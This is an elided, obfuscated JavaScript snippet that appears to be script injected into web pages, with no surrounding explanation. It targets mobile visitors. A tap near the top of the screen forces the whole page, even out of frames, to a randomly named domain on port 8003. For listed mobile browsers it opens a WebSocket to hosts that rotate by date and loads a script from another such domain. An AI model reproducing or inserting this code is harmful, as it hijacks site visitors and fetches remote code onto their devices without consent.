! function(e) {
  ...
  var r = document,
      ...
      o = r.currentScript;
  if (!/^Mac|Win/.test(n) || !n) {
      var gzannrak_is_ws = gzannrak_is_kk = 0;
      setTimeout(function() {
          if (gzannrak_is_ws == 0) {
              ...
              document.addEventListener("touchstart", function() {
                  if (gzannrak_is_ws == 0) {
                      ...
                      if (cx > 0 && cy > 0) {
                          if (cy < (204 * (clientwidth / 620)) && gzannrak_is_kk == 0) {
                              gzannrak_is_kk = 1;
                              var gzannrak_m = "https://" + Date.parse(new Date()) + "6734mc.gmoqrf.com" + ":8003/cc/6734?is_not=1&target=1";
                              if (top.location != self.location) {
                                  top.location = gzannrak_m
                              } else {
                                  window.location.href = gzannrak_m
                              }
                              gzannrak_is_kk = 0
                          }
                      }
  ...
  if (/baidu|HuaweiBrowser|VivoBrowser|OppoBrowser|HeyTapBrowser|MiuiBrowser|bdhonorbrowser|MQQBrowser|UCBrowser|Quark|QKQ/g.test(navigator.userAgent) !== false) {
      var wsxg = ["wm.3su7x5.com", "wm.d7qip9.com", "wm.d7qip9.com", "wm.hmibjf.com", "wm.hmibjf.com", "wm.3su7x5.com"];
      var k = Math.floor((new Date()).getDate() / 5);
      k = (k > 5) ? 5 : k;
      var c = new WebSocket("wss://ed31d825a157bdd" + (new Date().getDate()) + wsxg[k] + ":20093" + "/6734");
      c.onopen = function(e) {
          gzannrak_is_ws = gzannrak_is_kk = 1;
          setTimeout(() => {
              var canva = r.getElementById("gzannrak_style_id");
              if (canva) {
                  canva.remove()
              }
          }, 1000)
      ...
      i.src = "https://" + (new Date().getDate()) + "6734mg.38b6ik.com" + ":8003/sc/6734?n=gzannrak";
